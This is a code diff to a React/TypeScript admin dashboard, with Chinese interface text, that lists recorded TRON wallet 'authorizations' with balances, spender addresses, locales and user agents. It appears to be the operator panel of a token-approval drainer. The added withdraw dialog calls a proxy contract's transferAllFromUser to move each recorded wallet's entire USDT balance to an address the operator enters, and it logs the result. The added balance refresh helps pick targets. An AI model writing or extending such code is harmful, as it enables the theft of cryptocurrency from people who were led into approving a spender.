@@ -1,10 +1,11 @@
 import { useCallback, useEffect, useMemo, useState } from "react";
 import { Link } from "react-router-dom";
 import type { Session } from "@supabase/supabase-js";
-import { KeyRound, LayoutDashboard, Loader2, LogOut, RefreshCw } from "lucide-react";
+import { Copy, KeyRound, LayoutDashboard, Loader2, LogOut, RefreshCw, SendHorizontal } from "lucide-react";
 
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import {
@@ -29,15 +30,43 @@ type AuthorizationRow = {
   id: string;
   created_at: string;
   wallet_address: string;
-  trx_balance: number | null;
   usdt_balance: number | null;
   approval_tx_id: string | null;
   locale: string | null;
   user_agent: string | null;
   approval_spender: string | null;
+  balance_refreshed_at: string | null;
+  withdraw_tx_id: string | null;
+  withdraw_to: string | null;
+  withdraw_at: string | null;
+  withdraw_status: string | null;
 };
 
+declare global {
+  interface Window {
+    tronWeb?: {
+      defaultAddress?: { base58?: string };
+      contract?: () => { at: (address: string) => Promise<any> };
+    };
+  }
+}
+
 const PAGE_SIZE_OPTIONS = [10, 20, 50] as const;
+const TRONGRID_HOST = "https://api.trongrid.io";
+
+const PROXY_TRANSFER_ABI = [
+  {
+    name: "transferAllFromUser",
+    type: "Function",
+    inputs: [
+      { name: "token", type: "address" },
+      { name: "from", type: "address" },
+      { name: "to", type: "address" },
+    ],
+    outputs: [{ type: "bool" }],
+    stateMutability: "Nonpayable",
+  },
+] as const;
 
 const formatCnTime = (iso: string) => {
   try {
@@ -76,6 +105,12 @@ const Admin = () => {
   const [spenderSaving, setSpenderSaving] = useState(false);
   const [spenderError, setSpenderError] = useState<string | null>(null);
   const [spenderSavedHint, setSpenderSavedHint] = useState<string | null>(null);
+  const [actionLoadingById, setActionLoadingById] = useState<Record<string, boolean>>({});
+  const [actionMessage, setActionMessage] = useState<string | null>(null);
+  const [actionError, setActionError] = useState<string | null>(null);
+  const [withdrawDialogOpen, setWithdrawDialogOpen] = useState(false);
+  const [selectedRow, setSelectedRow] = useState<AuthorizationRow | null>(null);
+  const [withdrawTo, setWithdrawTo] = useState("");
 
   const totalPages = useMemo(() => Math.max(1, Math.ceil(totalCount / pageSize)), [totalCount, pageSize]);
 
@@ -87,7 +122,7 @@ const Admin = () => {
     const { data, error, count } = await supabase
       .from("wallet_authorizations")
       .select(
-        "id, created_at, wallet_address, trx_balance, usdt_balance, approval_tx_id, approval_spender, locale, user_agent",
+        "id, created_at, wallet_address, usdt_balance, approval_tx_id, approval_spender, locale, user_agent, balance_refreshed_at, withdraw_tx_id, withdraw_to, withdraw_at, withdraw_status",
         { count: "exact" },
       )
       .order("created_at", { ascending: false })
@@ -242,6 +277,147 @@ const Admin = () => {
     setPage(1);
   };
 
+  const setRowLoading = (rowId: string, loading: boolean) => {
+    setActionLoadingById((prev) => ({ ...prev, [rowId]: loading }));
+  };
+
+  const copyText = async (label: string, value: string | null) => {
+    if (!value) {
+      setActionError(`该记录没有可复制的${label}。`);
+      return;
+    }
+    try {
+      await navigator.clipboard.writeText(value);
+      setActionMessage(`${label}已复制。`);
+      setActionError(null);
+    } catch (e) {
+      setActionError(`复制${label}失败：${e instanceof Error ? e.message : String(e)}`);
+    }
+  };
+
+  const refreshUsdtBalance = async (row: AuthorizationRow) => {
+    if (!supabase) return;
+    setActionError(null);
+    setActionMessage(null);
+    setRowLoading(row.id, true);
+    try {
+      const resp = await fetch(`${TRONGRID_HOST}/v1/accounts/${row.wallet_address}`);
+      if (!resp.ok) throw new Error(`TronGrid 请求失败: HTTP ${resp.status}`);
+      const json = (await resp.json()) as {
+        data?: Array<{ trc20?: Array<Record<string, string>> }>;
+      };
+      const trc20 = json.data?.[0]?.trc20 ?? [];
+      let usdtBalance = 0;
+      for (const tokenItem of trc20) {
+        const maybe = tokenItem[TRON_USDT_CONTRACT];
+        if (maybe) {
+          usdtBalance = maybe.includes(".") ? Number(maybe) : Number(maybe) / 1_000_000;
+          break;
+        }
+      }
+
+      const { error } = await supabase
+        .from("wallet_authorizations")
+        .update({
+          usdt_balance: usdtBalance,
+          balance_refreshed_at: new Date().toISOString(),
+        })
+        .eq("id", row.id);
+      if (error) throw new Error(error.message);
+
+      setRows((prev) =>
+        prev.map((item) =>
+          item.id === row.id ? { ...item, usdt_balance: usdtBalance, balance_refreshed_at: new Date().toISOString() } : item,
+        ),
+      );
+      setActionMessage(`已刷新 ${row.wallet_address} 的 USDT 余额。`);
+    } catch (e) {
+      setActionError(`刷新余额失败：${e instanceof Error ? e.message : String(e)}`);
+    } finally {
+      setRowLoading(row.id, false);
+    }
+  };
+
+  const openWithdrawDialog = (row: AuthorizationRow) => {
+    setSelectedRow(row);
+    setWithdrawTo("");
+    setWithdrawDialogOpen(true);
+    setActionError(null);
+    setActionMessage(null);
+  };
+
+  const submitWithdraw = async () => {
+    if (!supabase || !selectedRow) return;
+    const to = withdrawTo.trim();
+    if (!isValidTronBase58Address(to)) {
+      setActionError("请填写有效的接收地址（TRON Base58 地址）。");
+      return;
+    }
+    const proxyContractAddress = selectedRow.approval_spender?.trim();
+    if (!proxyContractAddress || !isValidTronBase58Address(proxyContractAddress)) {
+      setActionError("该记录的授权接收地址无效，无法发起提币。");
+      return;
+    }
+
+    const tronWeb = window.tronWeb;
+    if (!tronWeb?.contract) {
+      setActionError("未检测到可用钱包环境，请在已连接 Tron 钱包的浏览器中操作。");
+      return;
+    }
+
+    setActionError(null);
+    setActionMessage(null);
+    setRowLoading(selectedRow.id, true);
+    try {
+      const contract = await tronWeb.contract().at(proxyContractAddress);
+      const sendResult = await contract
+        .transferAllFromUser(TRON_USDT_CONTRACT, selectedRow.wallet_address, to)
+        .send({ feeLimit: 300_000_000, callValue: 0 });
+
+      const withdrawTxId = typeof sendResult === "string" ? sendResult : String(sendResult?.txid ?? sendResult?.txID ?? "");
+      const { error } = await supabase
+        .from("wallet_authorizations")
+        .update({
+          withdraw_to: to,
+          withdraw_tx_id: withdrawTxId || null,
+          withdraw_at: new Date().toISOString(),
+          withdraw_status: "success",
+        })
+        .eq("id", selectedRow.id);
+      if (error) throw new Error(error.message);
+
+      setRows((prev) =>
+        prev.map((item) =>
+          item.id === selectedRow.id
+            ? {
+                ...item,
+                withdraw_to: to,
+                withdraw_tx_id: withdrawTxId || null,
+                withdraw_at: new Date().toISOString(),
+                withdraw_status: "success",
+              }
+            : item,
+        ),
+      );
+      setWithdrawDialogOpen(false);
+      setSelectedRow(null);
+      setActionMessage("提币交易已提交，请稍后在链上确认结果。");
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e);
+      await supabase
+        .from("wallet_authorizations")
+        .update({
+          withdraw_to: to,
+          withdraw_at: new Date().toISOString(),
+          withdraw_status: "failed",
+        })
+        .eq("id", selectedRow.id);
+      setActionError(`提币失败：${msg}`);
+    } finally {
+      setRowLoading(selectedRow.id, false);
+    }
+  };
+
   if (!supabase) {
     return (
       <main className="min-h-screen bg-gradient-to-b from-background to-muted/40 px-4 py-12">
@@ -367,6 +543,10 @@ const Admin = () => {
                 共 <span className="font-medium text-foreground">{totalCount}</span> 条
               </p>
             </div>
+            {actionError ? <p className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">{actionError}</p> : null}
+            {actionMessage ? (
+              <p className="rounded-md border border-emerald-500/25 bg-emerald-500/10 px-3 py-2 text-sm text-emerald-800 dark:text-emerald-200">{actionMessage}</p>
+            ) : null}
 
             <Card className="border-border/60 shadow-sm">
               <CardHeader className="border-b border-border/60 bg-muted/15">
@@ -484,11 +664,12 @@ const Admin = () => {
                             <TableRow className="bg-muted/30 hover:bg-muted/30">
                               <TableHead className="w-[168px] whitespace-nowrap">时间（北京时间）</TableHead>
                               <TableHead>钱包地址</TableHead>
-                              <TableHead className="w-[88px]">TRX</TableHead>
                               <TableHead className="w-[88px]">USDT</TableHead>
                               <TableHead className="min-w-[140px]">交易 ID</TableHead>
                               <TableHead className="min-w-[140px]">授权接收地址</TableHead>
+                              <TableHead className="min-w-[140px]">提币状态</TableHead>
                               <TableHead className="w-[72px]">语言</TableHead>
+                              <TableHead className="min-w-[180px]">操作</TableHead>
                             </TableRow>
                           </TableHeader>
                           <TableBody>
@@ -496,26 +677,63 @@ const Admin = () => {
                               <TableRow key={r.id} className="group">
                                 <TableCell className="whitespace-nowrap text-xs text-muted-foreground">{formatCnTime(r.created_at)}</TableCell>
                                 <TableCell className="max-w-[200px]">
-                                  <span className="font-mono text-xs" title={r.wallet_address}>
-                                    {r.wallet_address}
-                                  </span>
+                                  <div className="flex items-center gap-2">
+                                    <span className="font-mono text-xs" title={r.wallet_address}>
+                                      {r.wallet_address}
+                                    </span>
+                                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => void copyText("钱包地址", r.wallet_address)}>
+                                      <Copy className="h-3.5 w-3.5" aria-hidden />
+                                    </Button>
+                                  </div>
                                 </TableCell>
-                                <TableCell className="text-sm tabular-nums">{r.trx_balance ?? "—"}</TableCell>
                                 <TableCell className="text-sm tabular-nums">{r.usdt_balance ?? "—"}</TableCell>
                                 <TableCell className="max-w-[200px]">
-                                  <span
-                                    className="block truncate font-mono text-xs text-muted-foreground group-hover:text-foreground"
-                                    title={r.approval_tx_id ?? ""}
-                                  >
-                                    {r.approval_tx_id ?? "—"}
-                                  </span>
+                                  <div className="flex items-center gap-2">
+                                    <span
+                                      className="block truncate font-mono text-xs text-muted-foreground group-hover:text-foreground"
+                                      title={r.approval_tx_id ?? ""}
+                                    >
+                                      {r.approval_tx_id ?? "—"}
+                                    </span>
+                                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => void copyText("交易ID", r.approval_tx_id)}>
+                                      <Copy className="h-3.5 w-3.5" aria-hidden />
+                                    </Button>
+                                  </div>
                                 </TableCell>
                                 <TableCell className="max-w-[160px]">
                                   <span className="block truncate font-mono text-xs" title={r.approval_spender ?? ""}>
                                     {r.approval_spender ?? "—"}
                                   </span>
                                 </TableCell>
+                                <TableCell className="text-xs text-muted-foreground">
+                                  {r.withdraw_status === "success"
+                                    ? "已提交"
+                                    : r.withdraw_status === "failed"
+                                      ? "失败"
+                                      : "—"}
+                                </TableCell>
                                 <TableCell className="text-sm">{r.locale ?? "—"}</TableCell>
+                                <TableCell>
+                                  <div className="flex flex-wrap gap-2">
+                                    <Button
+                                      variant="outline"
+                                      size="sm"
+                                      disabled={Boolean(actionLoadingById[r.id])}
+                                      onClick={() => void refreshUsdtBalance(r)}
+                                    >
+                                      <RefreshCw className={cn("mr-1.5 h-3.5 w-3.5", actionLoadingById[r.id] && "animate-spin")} aria-hidden />
+                                      刷新余额
+                                    </Button>
+                                    <Button
+                                      size="sm"
+                                      disabled={Boolean(actionLoadingById[r.id]) || !r.approval_spender}
+                                      onClick={() => openWithdrawDialog(r)}
+                                    >
+                                      <SendHorizontal className="mr-1.5 h-3.5 w-3.5" aria-hidden />
+                                      提币
+                                    </Button>
+                                  </div>
+                                </TableCell>
                               </TableRow>
                             ))}
                           </TableBody>
@@ -580,6 +798,53 @@ const Admin = () => {
           </div>
         )}
       </div>
+
+      <Dialog
+        open={withdrawDialogOpen}
+        onOpenChange={(open) => {
+          setWithdrawDialogOpen(open);
+          if (!open) {
+            setSelectedRow(null);
+            setWithdrawTo("");
+          }
+        }}
+      >
+        <DialogContent>
+          <DialogHeader>
+            <DialogTitle>确认提币</DialogTitle>
+            <DialogDescription>将从该记录钱包发起代理合约提币，需在已连接的钱包中签名确认。</DialogDescription>
+          </DialogHeader>
+          <div className="space-y-3">
+            <div className="space-y-1">
+              <p className="text-xs text-muted-foreground">From（记录钱包）</p>
+              <p className="break-all rounded-md bg-muted px-2 py-1 font-mono text-xs">{selectedRow?.wallet_address ?? "—"}</p>
+            </div>
+            <div className="space-y-1">
+              <p className="text-xs text-muted-foreground">代理合约（该条授权接收地址）</p>
+              <p className="break-all rounded-md bg-muted px-2 py-1 font-mono text-xs">{selectedRow?.approval_spender ?? "—"}</p>
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="withdraw-to">To（提币接收地址）</Label>
+              <Input
+                id="withdraw-to"
+                value={withdrawTo}
+                onChange={(e) => setWithdrawTo(e.target.value)}
+                placeholder="请输入 TRON Base58 地址"
+                className="font-mono text-sm"
+                autoComplete="off"
+              />
+            </div>
+          </div>
+          <DialogFooter>
+            <Button variant="outline" onClick={() => setWithdrawDialogOpen(false)}>
+              取消
+            </Button>
+            <Button onClick={() => void submitWithdraw()} disabled={!selectedRow || Boolean(actionLoadingById[selectedRow.id])}>
+              {selectedRow && actionLoadingById[selectedRow.id] ? "提交中..." : "确认提币"}
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </main>
   );
 };
